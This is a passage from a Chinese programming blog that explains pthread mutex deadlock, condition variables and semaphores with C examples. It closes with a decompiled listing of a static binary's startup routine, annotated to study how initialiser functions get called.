pthread_mutex_unlock(&amp;lock2);\tpthread_mutex_unlock(&amp;lock1);\tputs(&quot;信号释放完毕&quot;);\treturn NULL;&#125;int main()&#123; //互斥锁初始化 pthread_mutex_init(&amp;lock1,NULL);//属性采用默认值 pthread_mutex_init(&amp;lock2,NULL); pthread_t tid[2];//模拟两个执行流 //创建两个线程 ,线程的ID放入了 tid[2] int i=0; int ret = pthread_create(&amp;tid[0],NULL,ThreadA,NULL); if(ret &lt; 0) perror(&quot;pthread_create A error&quot;); ret = pthread_create(&amp;tid[1],NULL,ThreadB,NULL); if(ret &lt; 0) perror(&quot;pthread_create B error&quot;); //主线程进行等待 for(i=0;i&lt;100;i++) &#123; sleep(1); puts(&quot;......&quot;); &#125; //互斥锁销毁 pthread_mutex_destroy(&amp;lock1); pthread_mutex_destroy(&amp;lock2); return 0;&#125; 输出 1234567891011121314151617181920dqx@resmile-1:/mnt/e/0xC0de/elf/C$ ./qA抓取lock1信号B抓取lock2信号............A请求B释放lock2信号......B请求A释放lock1信号........................................................................^Cdqx@resmile-1:/mnt/e/0xC0de/elf/C$ Condition Variable 条件互斥线程间的同步还有这样一种情况： 线程A需要等某个条件成立才能继续往下执行，现在这个条件不成立， 线程A就阻塞等待，而线程B在执行过程中使这个条件成立了， 就唤醒线程A继续执行。在pthread库中通过条件变量（Condition Variable）来阻塞等待一个条件，或者唤醒等待这个条件的线程。Condition Variable用pthread_cond_t类型的变量表示，可以这样初始化和销毁 12345678#include &lt;pthread.h&gt;int pthread_cond_destroy(pthread_cond_t *cond);int pthread_cond_init( pthread_cond_t *restrict cond,\tconst pthread_condattr_t *restrict attr);pthread_cond_t cond = PTHREAD_COND_INITIALIZER; 返回值：成功返回0，失败返回错误号 和Mutex的初始化和销毁类似， pthread_cond_init函数初始化一个Condition Variable， attr参数为NULL则表示缺省属性， pthread_cond_destroy函数销毁一个Condition Variable。 如果Condition Variable是静态分配的，也可以用宏定义PTHEAD_COND_INITIALIZER初始化，相当于 用pthread_cond_init函数初始化并且attr参数为NULL 123456789101112#include &lt;pthread.h&gt;int pthread_cond_timedwait( pthread_cond_t *restrict cond, pthread_mutex_t *restrict mutex, const struct timespec *restrict abstime);int pthread_cond_wait( pthread_cond_t *restrict cond, pthread_mutex_t *restrict mutex);int pthread_cond_broadcast(pthread_cond_t *cond);int pthread_cond_signal(pthread_cond_t *cond); 可见，一个Condition Variable总是和一个Mutex搭配使用的。 一个线程可以调用pthread_cond_wait在一个Condition Variable上阻塞等待， 这个函数做以下三步操作： 1 释放Mutex信号 2 阻塞等待 3 当被唤醒时，重新获得Mutex并返回 pthread_cond_timedwait函数还有一个额外的参数可以设定等待超时， 如果到达了abstime所指定的时刻仍然没有别的线程来唤醒当前线程，就返回ETIMEDOUT。 一个线程可以调用pthread_cond_signal唤醒在某个Condition Variable上等待的另一个线程， 也可以调用pthread_cond_broadcast唤醒在这个Condition Variable上等待的所有线程 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;unsigned int MsgKey2;pthread_cond_t FoodExit = PTHREAD_COND_INITIALIZER;//初始化条件体pthread_mutex_t Lock = PTHREAD_MUTEX_INITIALIZER;//初始化互斥体void* PeopleOpenDoor(void* p)&#123; unsigned int tmp = 0; while (1) &#123; pthread_mutex_lock(&amp;Lock); puts(&quot;E Receive Key1:0x40&quot;); if (MsgKey2 == 0) &#123; puts(&quot;E No Key2&quot;); pthread_cond_wait(&amp;FoodExit, &amp;Lock);//等待第二把钥匙 &#125; printf(&quot;E Receive Key2 : %X &quot;, MsgKey2); MsgKey2 = 0; pthread_mutex_unlock(&amp;Lock); puts(&quot;E SendBack All Key&quot;); &#125;&#125;void* KeyReleasae(void* p)&#123; unsigned int KeyCode = 0; while (1) &#123; pthread_mutex_lock(&amp;Lock); puts(&quot;C Receive All Key&quot;); MsgKey2 = rand() % 100 + 20; pthread_mutex_unlock(&amp;Lock); puts(&quot;C Send Key1&quot;); pthread_cond_signal(&amp;FoodExit); puts(&quot;C Send Key2&quot;); sleep(2); &#125;&#125;int main(int argc, char* argv[])&#123; pthread_t CookerID, EaterID; srand(time(NULL)); pthread_create(&amp;CookerID, NULL, KeyReleasae, NULL); pthread_create(&amp;EaterID, NULL, PeopleOpenDoor, NULL); pthread_join(CookerID, NULL); pthread_join(EaterID, NULL); return 0;&#125; 其实,相当于多了一个互斥体,说 说是什么条件控制,让人大小的是,那个条件竟然是DIY的if 这个和if+互斥体没啥区别 Semaphore 信号量一次性释放后多个信号 Mutex变量是非0即1的，可看作一种资源的可用数量，初始化时Mutex是1，表示有一个可用资源， 加锁时获得该资源，将Mutex减到0，表示不再有可用资源， 解锁时释放该资源，将Mutex重新加到1，表示又有了一个可用资源 信号量（Semaphore）和Mutex类似，表示可用资源的数量，和Mutex不同的是这个数量可以大于1 这种信号量不仅可用于同一进程的多线程间同步，也可用于不同进程间的同步 123456789101112#include &lt;semaphore.h&gt;int sem_init( //初始化信号量 sem_t *sem, //semaphore变量的类型 int pshared, //参数为0表示信号量用于同一进程的线程间同步\tunsigned int value//初始信号数量);int sem_wait(sem_t *sem);//获得信号，使信号量的值减1int sem_trywait(sem_t *sem);\t//如果调用sem_wait()时信号量的值已经是0，则挂起等待\t//如果不希望挂起等待，可以调用sem_trywait()int sem_post(sem_t * sem);//调用sem_post()可以释放资源,使信号量的值加1，同时唤醒挂起等待的线程int sem_destroy(sem_t * sem); semaphore变量的类型为sem_t 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;stdlib.h&gt;#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;semaphore.h&gt;#include &lt;unistd.h&gt;#define NUM 3int Food[NUM];sem_t EatDone, MakeDone;void* producer(void* arg)&#123; int p = 0; while (1) &#123; sem_wait(&amp;EatDone); Food[p] = rand() % 1000 + 1; printf(&quot;P %08X &quot;, Food[p]); sem_post(&amp;MakeDone);//信号量++ p = (p + 1) % NUM;//随机释放食物 sleep(rand() % NUM);//随机睡眠 &#125;&#125;void* consumer(void* arg)&#123; int c = 0; while (1) &#123; sem_wait(&amp;MakeDone); printf(&quot;C %08X &quot;, Food[c]); Food[c] = 0; sem_post(&amp;EatDone);//信号量++MakeDone c = (c + 1) % NUM; sleep(rand() % NUM); &#125;&#125;int main(int argc, char* argv[])&#123; pthread_t pid, cid; srand(time(NULL)); sem_init(&amp;EatDone, 0, 1);//初始化,有NUM个信号 sem_init(&amp;MakeDone, 0, 0);//初始化,有0个信号 pthread_create(&amp;pid, NULL, producer, NULL); pthread_create(&amp;cid, NULL, consumer, NULL); pthread_join(pid, NULL); pthread_join(cid, NULL); sem_destroy(&amp;EatDone); sem_destroy(&amp;MakeDone); return 0;&#125; 小节主要讲了线程的创建,挂起 然后是多线程的资源访问问题 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746void __fastcall sub_404E40(__int64 a1, unsigned int a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, __int64 a7)&#123; __int64 v9; // rdi __int64 v15; // rdx __int64 v16; // rcx unsigned int v17; // ecx unsigned int v18; // eax int v19; // er9 unsigned int v20; // er11 __int64 v21; // r10 __int64 v22; // rbx int v23; // eax unsigned int v24; // ebx unsigned int v25; // er15 __int64 v26; // rdx __int64 v27; // rdx __m128i v28; // xmm2 __m128i v29; // xmm4 __m128i v30; // xmm1 __m128i v31; // xmm0 unsigned int v32; // eax unsigned __int64 *v33; // rdx signed __int64 v34; // rax int v35; // edx __int64 (__fastcall ***i)(); // rbx __int64 v37; // rax __int64 *v38; // r14 __int64 v44; // rsi unsigned __int64 v54; // rax int v55; // eax __int64 v56; // rbx __int64 v57; // r15 const char *v58; // rax __int64 v64; // rsi int v74; // eax int v75; // eax __int64 v76; // rdx signed __int64 v77; // rax int v78; // edx unsigned __int64 *v79; // rdx signed __int64 v80; // rax int v81; // eax __int64 v82; // rax __int64 v83; // r10 unsigned int v84; // er11 unsigned int v95; // eax __int64 v106; // rsi int v116; // eax unsigned int v122; // ecx unsigned int v123; // edx unsigned int v124; // ecx __int64 v125; // rdx __int64 v126; // rax __m128i v127; // [rsp+8h] [rbp-110h] BYREF unsigned __int64 v128; // [rsp+18h] [rbp-100h] BYREF __m128i v129; // [rsp+20h] [rbp-F8h] BYREF __int64 v130; // [rsp+30h] [rbp-E8h] BYREF __int64 v131; // [rsp+38h] [rbp-E0h] __int64 v132; // [rsp+40h] [rbp-D8h] BYREF __int64 v133; // [rsp+48h] [rbp-D0h] __int64 v134; // [rsp+50h] [rbp-C8h] BYREF __int64 v135; // [rsp+58h] [rbp-C0h] BYREF __int64 v136; // [rsp+60h] [rbp-B8h] __int64 v137; // [rsp+68h] [rbp-B0h] BYREF __int64 v138; // [rsp+70h] [rbp-A8h] __int64 v139; // [rsp+78h] [rbp-A0h] __int64 v140; // [rsp+80h] [rbp-98h] int v141; // [rsp+8Ch] [rbp-8Ch] unsigned int v142; // [rsp+98h] [rbp-80h] BYREF unsigned int v143; // [rsp+9Ch] [rbp-7Ch] BYREF unsigned int v144; // [rsp+A0h] [rbp-78h] BYREF unsigned int v145; // [rsp+A4h] [rbp-74h] BYREF unsigned __int64 v146; // [rsp+A8h] [rbp-70h] BYREF __int64 v147; // [rsp+B0h] [rbp-68h] BYREF __int64 v148; // [rsp+B8h] [rbp-60h] BYREF unsigned __int64 code[11]; // [rsp+C0h] [rbp-58h] BYREF v138 = a1; v9 = a3 + 8LL * (int)a2 + 8; v139 = a6; qword_4F64A8 = v9; qword_4EEA80 = a7; do v9 += 8LL; while ( *(_QWORD *)(v9 - 8) ); sub_467490(); if ( !qword_4F65D0 ) &#123; qword_4F65D0 = (__int64)(&amp;dword_400000 + 16); qword_4F65C8 = 10LL; &#125; sub_4696D0(); sub_466450(qword_4F64A8); _RAX = 0LL; v142 = 0; v143 = 0; v144 = 0; __asm &#123; cpuid &#125; dword_4F6624 = _RAX; if ( (_DWORD)_RBX == 1970169159 &amp;&amp; (_DWORD)_RCX == 1818588270 ) &#123; if ( (_DWORD)_RDX != 1231384169 ) &#123;LABEL_8: sub_404000(0LL, 0LL, 0LL, 0LL); sub_404990(0LL, 0LL, v15, v16); v17 = v143; v18 = v144; v19 = 4; v20 = v142; goto LABEL_9; &#125; sub_404000(&amp;v142, &amp;v143, code, &amp;v144); _RAX = 0x80000000LL; __asm &#123; cpuid &#125; v106 = (unsigned int)_RAX; if ( (unsigned int)_RAX &gt; 0x80000000 ) &#123; _RAX = 2147483649LL; __asm &#123; cpuid &#125; dword_4F6674 = _RAX; dword_4F6678 = _RBX; dword_4F667C = _RCX; dword_4F6680 = _RDX; if ( (unsigned int)v106 &gt; 0x80000006 ) &#123; _RAX = 2147483655LL; __asm &#123; cpuid &#125; dword_4F66B4 = _RAX; dword_4F66B8 = _RBX; dword_4F66BC = _RCX; dword_4F66C0 = _RDX; if ( (_DWORD)v106 != -2147483641 ) &#123; _RAX = 2147483656LL; __asm &#123; cpuid &#125; dword_4F66D4 = _RAX; dword_4F66D8 = _RBX; dword_4F66DC = _RCX; dword_4F66E0 = _RDX; &#125; &#125; &#125; sub_404990(&amp;v142, v106, _RDX, _RCX); v17 = v143; if ( v142 != 6 ) goto LABEL_141; v122 = LODWORD(code[0]) + v143; v143 = v122; v123 = v122; if ( v122 &gt; 0x5D ) &#123; v124 = v122 - 95; if ( v124 &gt; 0x3D ) &#123; if ( (dword_4F663C &amp; 0x10000000) != 0 ) goto LABEL_180;LABEL_181: v18 = v144; if ( v123 &lt;= 0x5E ) &#123;LABEL_182: if ( v123 &gt; 0x3B ) &#123; v125 = v123 - 60; if ( (unsigned int)v125 &lt;= 0x22 ) __asm &#123; jmp rdx &#125; &#125;LABEL_178: v17 = v143; goto LABEL_142; &#125;LABEL_175: if ( (v123 &amp; 0xFFFFFFEF) == 142 &amp;&amp; v18 &lt;= 0xC ) &#123; LODWORD(qword_4F6668) = qword_4F6668 &amp; 0xFFFFF7EF; v17 = v143; dword_4F6670 |= 0x800u; goto LABEL_142; &#125; goto LABEL_178; &#125; if ( ((((_QWORD)&amp;loc_40FFFE + 3) &lt;&lt; 39) &amp; (1LL &lt;&lt; v124)) != 0 ) &#123; dword_4F6754 |= 0x139u; v18 = v144; goto LABEL_175; &#125; if ( ((1LL &lt;&lt; v124) &amp; 0x8400001) == 0 ) &#123; if ( (dword_4F663C &amp; 0x10000000) == 0 ) &#123; v18 = v144; goto LABEL_175; &#125; goto LABEL_180; &#125; &#125; else &#123; if ( v122 &lt;= 0x24 ) &#123; if ( v122 != 28 ) &#123; if ( v122 &lt;= 0x1C ) &#123; if ( v122 != 26 ) &#123;LABEL_168: if ( (dword_4F663C &amp; 0x10000000) == 0 ) &#123; v17 = v143;LABEL_141: v18 = v144; goto LABEL_142; &#125; &#125; &#125; else if ( v122 - 30 &gt; 1 ) &#123; goto LABEL_168; &#125;LABEL_180: dword_4F6754 |= 0x39u; goto LABEL_181; &#125;LABEL_193: dword_4F6754 |= 4u; v17 = v143; v18 = v144;LABEL_142: if ( (dword_4F6658 &amp; 0x8000000) != 0 ) goto LABEL_146; if ( (dword_4F66F4 &amp; 0x10) == 0 ) dword_4F6754 |= 0x1000u; if ( (qword_4F6668 &amp; 0x800) != 0 )LABEL_146: dword_4F6754 |= 0x400u; if ( (dword_4F6660 &amp; 0x10) != 0 ) dword_4F6754 |= 0x8000u; v20 = v142; v19 = 1; goto LABEL_9; &#125; v126 = 1LL &lt;&lt; ((unsigned __int8)v122 - 37); if ( (v126 &amp; 0x1A401A000040000LL) == 0 ) &#123; if ( (v126 &amp; 0x681) != 0 ) goto LABEL_180; if ( v122 != 38 ) &#123; if ( (dword_4F663C &amp; 0x10000000) == 0 ) &#123; v18 = v144; goto LABEL_182; &#125; goto LABEL_180; &#125; goto LABEL_193; &#125; &#125; dword_4F6754 |= 0x138u; goto LABEL_181; &#125; if ( (_DWORD)_RBX == 1752462657 &amp;&amp; (_DWORD)_RCX == 1145913699 ) &#123; if ( (_DWORD)_RDX != 1769238117 ) goto LABEL_8; goto LABEL_57; &#125; if ( (_DWORD)_RBX == 1869052232 &amp;&amp; (_DWORD)_RCX == 1701734773 ) &#123; if ( (_DWORD)_RDX != 1852131182 ) goto LABEL_8;LABEL_57: sub_404000(&amp;v142, &amp;v143, code, &amp;v144); _RAX = 0x80000000LL; __asm &#123; cpuid &#125; v44 = (unsigned int)_RAX; if ( (unsigned int)_RAX &gt; 0x80000000 ) &#123; _RAX = 2147483649LL; __asm &#123; cpuid &#125; dword_4F6674 = _RAX; dword_4F6678 = _RBX; dword_4F667C = _RCX; dword_4F6680 = _RDX; if ( (unsigned int)v44 &gt; 0x80000006 ) &#123; _RAX = 2147483655LL; __asm &#123; cpuid &#125; dword_4F66B4 = _RAX; dword_4F66B8 = _RBX; dword_4F66BC = _RCX; dword_4F66C0 = _RDX; if ( (_DWORD)v44 != -2147483641 ) &#123; _RAX = 2147483656LL; __asm &#123; cpuid &#125; dword_4F66D4 = _RAX; dword_4F66D8 = _RBX; dword_4F66DC = _RCX; dword_4F66E0 = _RDX; &#125; &#125; &#125; sub_404990(&amp;v142, v44, _RDX, _RCX); if ( (dword_4F664C &amp; 0x10000000) != 0 ) LODWORD(qword_4F668C) = dword_4F667C &amp; 0x10000 | qword_4F668C; v17 = v143; if ( v142 == 21 &amp;&amp; v143 - 96 &lt;= 0x1F ) &#123; v81 = dword_4F6754; BYTE1(v81) = BYTE1(dword_4F6754) &amp; 0xFD; dword_4F6754 = v81 | 0xA; &#125; v18 = v144; v20 = v142; v19 = 2;LABEL_9: if ( (dword_4F6640 &amp; 0x100) != 0 ) dword_4F6754 |= 0x40u; if ( (dword_4F6640 &amp; 0x8000) != 0 ) dword_4F6754 |= 0x80u; dword_4F6620 = v19; dword_4F6630 = v18; v146 = -1LL; v145 = 0; qword_4F6628 = _mm_unpacklo_epi32(_mm_cvtsi32_si128(v20), _mm_cvtsi32_si128(v17)).m128i_u64[0]; switch ( v19 ) &#123; case 1: v141 = 1; v127.m128i_i64[0] = sub_4048A0(188LL); v132 = sub_4048A0(191LL); v146 = sub_4048A0(194LL); v127.m128i_i64[1] = sub_4048A0(185LL); v129.m128i_i64[0] = v127.m128i_i64[0]; v128 = sub_4048A0(187LL); v130 = sub_4048A0(189LL); v131 = sub_4048A0(190LL); v140 = v132; v133 = sub_4048A0(192LL); v134 = sub_4048A0(193LL); v135 = sub_4048A0(195LL); v136 = sub_4048A0(196LL); v137 = sub_4048A0(197LL); sub_404190(&amp;v146, &amp;v145, v132); v21 = v132; v19 = 1; break; case 3: v141 = 3; v127.m128i_i64[0] = sub_403BA0(188LL); v132 = sub_403BA0(191LL); v146 = sub_403BA0(194LL); v127.m128i_i64[1] = sub_403BA0(185LL); v129.m128i_i64[0] = v127.m128i_i64[0]; v128 = sub_403BA0(187LL); v130 = sub_403BA0(189LL); v131 = sub_403BA0(190LL); v133 = sub_403BA0(192LL); v134 = sub_403BA0(193LL); v135 = sub_403BA0(195LL); v136 = sub_403BA0(196LL); v140 = v132; sub_404190(&amp;v146, &amp;v145, v132); v21 = v132; v137 = -1LL; v19 = 3; break; case 2: v127.m128i_i64[0] = sub_403D70(188LL); sub_403D70(191LL); v137 = sub_403D70(194LL); v146 = v137; v127.m128i_i64[1] = sub_403D70(185LL); v129.m128i_i64[0] = v127.m128i_i64[0]; v128 = sub_403D70(187LL); v130 = sub_403D70(189LL); v82 = sub_403D70(190LL); v132 = v83; v131 = v82; v133 = sub_403D70(192LL); v134 = sub_403D70(193LL); v135 = sub_403D70(195LL); v136 = sub_403D70(196LL); _RAX = 0x80000000LL; __asm &#123; cpuid &#125; if ( v137 &lt;= 0 ) &#123; v146 = v21; v137 = -1LL; &#125; else &#123; if ( (unsigned int)_RAX &gt; 0x80000007 ) &#123; _RAX = 2147483656LL; __asm &#123; cpuid &#125; v95 = 1 &lt;&lt; ((unsigned __int16)_RCX &gt;&gt; 12); v145 = v95; if ( v84 &lt;= 0x16 ) goto LABEL_128; &#125; _RAX = 1LL; __asm &#123; cpuid &#125; if ( (_RDX &amp; 0x10000000) != 0 ) v145 = BYTE2(_RBX); v95 = v145; if ( v145 )LABEL_128: v146 = v137 / v95; if ( v84 &lt;= 0x16 ) &#123; v137 = -1LL; v146 += v21; &#125; else &#123; _RAX = 2147483677LL; __asm &#123; cpuid &#125; v137 = -1LL; v146 *= (((unsigned int)_RAX &gt;&gt; 14) &amp; 0xFFF) + 1LL; &#125; &#125; break; default: v137 = -1LL; v21 = -1LL; v136 = -1LL; v135 = -1LL; v134 = -1LL; v133 = -1LL; v132 = -1LL; v131 = -1LL; v130 = -1LL; v129.m128i_i64[0] = -1LL; v128 = -1LL; v127.m128i_i64[1] = -1LL; v127.m128i_i64[0] = -1LL; break; &#125; xmmword_4F67A0 = (__int128)_mm_loadh_ps((const double *)&amp;v128); v22 = 3 * v146 + 3; if ( ((3 * v146) &amp; 0x8000000000000000LL) == 0LL ) v22 = 3 * v146; xmmword_4F67B0 = (__int128)_mm_loadh_ps((const double *)&amp;v130); v127.m128i_i64[1] = v22 &gt;&gt; 2; xmmword_4F67C0 = (__int128)_mm_loadh_ps((const double *)&amp;v132); xmmword_4F67D0 = (__int128)_mm_loadh_ps((const double *)&amp;v134); xmmword_4F67E0 = (__int128)_mm_loadh_ps((const double *)&amp;v135); xmmword_4F67F0 = (__int128)_mm_loadh_ps((const double *)&amp;v137); if ( (qword_4F6668 &amp; 0x10000) != 0 &amp;&amp; (dword_4F6754 &amp; 0x1000) == 0 ) &#123; v24 = 0x4000; v25 = 512; &#125; else &#123; v23 = dword_4F6754 &amp; 0x200; v24 = v23 == 0 ? 2048 : 0x2000; v25 = v23 == 0 ? 128 : 256; &#125; if ( (dword_4F6670 &amp; 0x10) != 0 ) v24 = 2112; if ( v19 != 2 ) v21 = v127.m128i_i64[1]; v128 = v21; sub_466CC0(28LL, code, 0LL); v26 = code[0]; if ( !code[0] ) v26 = v127.m128i_i64[0]; v127.m128i_i64[0] = v26; sub_466CC0(4LL, code, 0LL); if ( code[0] ) v146 = code[0]; sub_466CC0(16LL, code, 0LL); v27 = code[0]; if ( !code[0] ) v27 = v127.m128i_i64[1]; v127.m128i_i64[1] = v27; sub_466CC0(10LL, code, 0LL); v131 = v25; if ( (__int64)code[0] &gt; v25 ) v24 = code[0]; sub_466CC0(15LL, code, 0LL); v28 = _mm_loadl_epi64((const __m128i *)&amp;v128); v147 = v127.m128i_i64[0]; v29 = (__m128i)code[0]; v130 = code[0]; code[0] = -1LL; v129 = _mm_unpacklo_epi64(v28, v29); v148 = 0LL; sub_466300(28LL, &amp;v147, &amp;v148, code); code[0] = -1LL; v148 = 0LL; v147 = v146; v128 = v146; sub_466300(4LL, &amp;v147, &amp;v148, code); code[0] = -1LL; v147 = v127.m128i_i64[1]; v148 = 0LL; sub_466300(16LL, &amp;v147, &amp;v148, code); v147 = v24; v148 = v131; code[0] = -1LL; sub_466300(10LL, &amp;v147, &amp;v148, code); code[0] = -1LL; v147 = v130; v148 = 1LL; sub_466300(15LL, &amp;v147, &amp;v148, code); v30 = _mm_loadl_epi64((const __m128i *)&amp;v127.m128i_i8[8]); v31 = _mm_unpacklo_epi64(_mm_loadl_epi64(&amp;v127), (__m128i)v128); xmmword_4F6790 = (__int128)_mm_load_si128(&amp;v129); xmmword_4F6770 = (__int128)v31; xmmword_4F6780 = (__int128)_mm_unpacklo_epi64(v30, _mm_cvtsi32_si128(v24)); sub_466CC0(24LL, code, sub_4689E0); v32 = dword_4F664C; if ( (dword_4F664C &amp; 0x8000000) != 0 ) &#123; if ( dword_4F664C &amp; 0x4000000 | dword_4F66A4 &amp; 2 ) goto LABEL_36; &#125; else &#123; dword_4F66A4 &amp;= 0xFFFFFFE8; v32 = dword_4F664C &amp; 0xFBFFFFFF; &#125; v32 &amp;= 0xCFFFEFFF; qword_4F6760 = 0LL; dword_4F6704 &amp;= 0xFFFFFFCF; dword_4F664C = v32; dword_4F6670 &amp;= 0xFC3FFEF3; LODWORD(qword_4F668C) = qword_4F668C &amp; 0xFFFEF7FF; qword_4F6668 = _mm_and_si128( _mm_loadl_epi64((const __m128i *)&amp;qword_4F6668), _mm_loadl_epi64((const __m128i *)&amp;qword_4BF6E8)).m128i_u64[0];LABEL_36: qword_4F65C0 = 2LL; if ( dword_4F6620 != 1 ) goto LABEL_37; if ( (qword_4F6668 &amp; 0x10000000) != 0 ) &#123; if ( (qword_4F6668 &amp; 0x8000000) != 0 ) &#123; if ( (qword_4F6668 &amp; 0x4000000) != 0 ) &#123; v58 = &quot;xeon_phi&quot;; goto LABEL_90; &#125; &#125; else if ( (qword_4F6668 &amp; 0x40020000) == 1073872896 &amp;&amp; (int)qword_4F6668 &lt; 0 ) &#123; qword_4F65C0 = 6LL; &#125; &#125; if ( (qword_4F6668 &amp; 0x20) == 0 || (v32 &amp; 0x1000) == 0 || (qword_4F6668 &amp; 0x108) != 264 || (qword_4F668C &amp; 0x20) == 0 || (v32 &amp; 0xC00000) != 12582912 ) &#123;LABEL_37: sub_466CC0(23LL, code, sub_4694A0); sub_466CC0(17LL, code, sub_469530); v34 = sys_arch_prctl((struct task_struct *)0x3001, (int)code, v33); v35 = 0; if ( v34 || (v35 = code[0], (code[0] &amp; 1) == 0) ) dword_4F6670 &amp;= ~0x100000u; if ( (v35 &amp; 2) == 0 &amp;&amp; (HIDWORD(qword_4F6668) &amp;= ~0x80u, !v35) || (dword_4F6804 = v35, (v35 &amp; 3) == 0) ) &#123;LABEL_41: if ( (__int64)xmmword_4F6770 &gt;= 0 &amp;&amp; (xmmword_4F6770 &amp; 0xFFFFFFFFFFFFFF00LL) != 0 ) &#123; qword_4EF130 = xmmword_4F6770 &amp; 0xFFFFFFFFFFFFFF00LL; qword_4EF138 = (__int64)(xmmword_4F6770 &amp; 0xFFFFFFFFFFFFFF00LL) &gt;&gt; 1; &#125; if ( xmmword_4F6770 &gt;= 0 &amp;&amp; (*((_QWORD *)&amp;xmmword_4F6770 + 1) &amp; 0xFFFFFFFFFFFFFF00LL) != 0 ) &#123; qword_4EF120 = *((_QWORD *)&amp;xmmword_4F6770 + 1) &amp; 0xFFFFFFFFFFFFFF00LL; qword_4EF128 = (__int64)(*((_QWORD *)&amp;xmmword_4F6770 + 1) &amp; 0xFFFFFFFFFFFFFF00LL) &gt;&gt; 1; &#125; qword_4EF118 = *((_QWORD *)&amp;xmmword_4F6780 + 1); qword_4F13E0 = xmmword_4F6780; qword_4EF110 = *((_QWORD *)&amp;xmmword_4F6790 + 1); qword_4F13D8 = xmmword_4F6790; if ( (dword_4F6754 &amp; 0x8000) != 0 ) dword_4F13D0 |= 1u; sub_401A60(); for ( i = &amp;off_4002E8; (unsigned __int64)i &lt; 0x400570; *v38 = v37 ) &#123; v38 = (__int64 *)*i; if ( *((_DWORD *)i + 2) != 37 ) sub_419770(&quot;Unexpected reloc type in static binary. &quot;); v37 = ((__int64 (*)(void))i[2])(); i += 3; &#125; sub_4063D0(); __writefsdword(0x48u, dword_4F6804); v54 = *(_QWORD *)qword_4EEA70; LOBYTE(v54) = 0; __writefsqword(0x28u, v54); v55 = sub_4695C0(); if ( v55 &gt;= 0 ) &#123; if ( !dword_4F65F8 || dword_4F65F8 &gt; (unsigned int)v55 ) dword_4F65F8 = v55; if ( v55 &gt; 197119 ) &#123; if ( qword_4EEF98 ) MEMORY[0](); __writefsqword(0x30u, *(_QWORD *)(qword_4EEA70 + 8)); if ( v139 ) sub_40D0A0(v139, 0LL, 0LL); sub_469720(1LL); sub_4698E0(a2, a3, qword_4F64A8); sub_40D0A0(sub_403F20, 0LL, 0LL); if ( dword_4EEAB0 ) sub_406230(); v56 = qword_4F64A8; sub_401000(); v57 = 0LL; if ( ((char *)&amp;off_4EB798 - (char *)&amp;off_4EB788) &gt;&gt; 3 ) &#123; //********************************************************************************** do ((void (__fastcall *)(_QWORD, __int64, __int64))*(&amp;off_4EB788 + v57++))(a2, a3, v56); //********************************************************************************** while ( ((char *)&amp;off_4EB798 - (char *)&amp;off_4EB788) &gt;&gt; 3 != v57 ); &#125; sub_45DC80(0LL, 0LL); sub_403F60(v138, a2, a3); &#125; sub_419770(&quot;FATAL: kernel too old &quot;); &#125; sub_419770(&quot;FATAL: cannot determine kernel version &quot;); &#125; v75 = BYTE4(qword_4F6668) &amp; 0x80; if ( (dword_4F6670 &amp; 0x100000) != 0 ) &#123; if ( (qword_4F6668 &amp; 0x8000000000LL) != 0 ) &#123;LABEL_114: v79 = (unsigned __int64 *)(byte_4F6800 &amp; 3); if ( (_BYTE)v79 != 3 &amp;&amp; (byte_4F6800 &amp; 0xC) != 12 ) v80 = sys_arch_prctl((struct task_struct *)0x3003, 0, v79); goto LABEL_41; &#125; &#125; else &#123; v76 = 1LL; if ( (qword_4F6668 &amp; 0x8000000000LL) != 0 ) goto LABEL_112; v75 = 1; &#125; v76 = v75 | 2u;LABEL_112: v77 = sys_arch_prctl((struct task_struct *)0x3002, v76, (unsigned __int64 *)v76); if ( !(_DWORD)v77 ) dword_4F6804 &amp;= ~v78; goto LABEL_114; &#125; v58 = &quot;haswell&quot;;LABEL_90: qword_4F6850 = (__int64)v58; goto LABEL_37; &#125; if ( (_DWORD)_RBX == 1953391939 &amp;&amp; (_DWORD)_RCX == 1936487777 ) &#123; if ( (_DWORD)_RDX != 1215460705 ) goto LABEL_8; &#125; else if ( (_DWORD)_RCX != 538995041 || (_DWORD)_RBX != 1750278176 || (_DWORD)_RDX != 1751608929 ) &#123; goto LABEL_8; &#125; sub_404000(&amp;v142, &amp;v143, &amp;v148, code); _RAX = 0x80000000LL; __asm &#123; cpuid &#125; v64 = (unsigned int)_RAX; if ( (unsigned int)_RAX &gt; 0x80000000 ) &#123; _RAX = 2147483649LL; __asm &#123; cpuid &#125; dword_4F6674 = _RAX; dword_4F6678 = _RBX; dword_4F667C = _RCX; dword_4F6680 = _RDX; if ( (unsigned int)v64 &gt; 0x80000006 ) &#123; _RAX = 2147483655LL; __asm &#123; cpuid &#125; dword_4F66B4 = _RAX; dword_4F66B8 = _RBX; dword_4F66BC = _RCX; dword_4F66C0 = _RDX; if ( (_DWORD)v64 != -2147483641 ) &#123; _RAX = 2147483656LL; __asm &#123; cpuid &#125; dword_4F66D4 = _RAX; 